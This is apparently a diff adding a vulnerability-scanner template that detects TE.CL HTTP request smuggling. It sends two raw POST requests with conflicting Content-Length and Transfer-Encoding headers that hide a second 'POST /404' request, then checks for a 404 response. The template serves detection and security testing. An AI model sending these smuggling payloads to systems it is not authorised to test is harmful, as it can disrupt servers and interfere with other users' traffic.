@@ -1,0 +1,45 @@
+id: confirming-te-cl-via-differential-responses-http-smuggling
+
+info:
+  name: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
+  author: pdteam
+  severity: info
+  reference: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses
+
+http:
+  - raw:
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      Content-length: 4
+      Transfer-Encoding: chunked
+      
+      5e
+      POST /404 HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 15
+      
+      x=1
+      0
+      
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      Content-length: 4
+      Transfer-Encoding: chunked
+      
+      5e
+      POST /404 HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 15
+      
+      x=1
+      0
+      
+    unsafe: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==404'
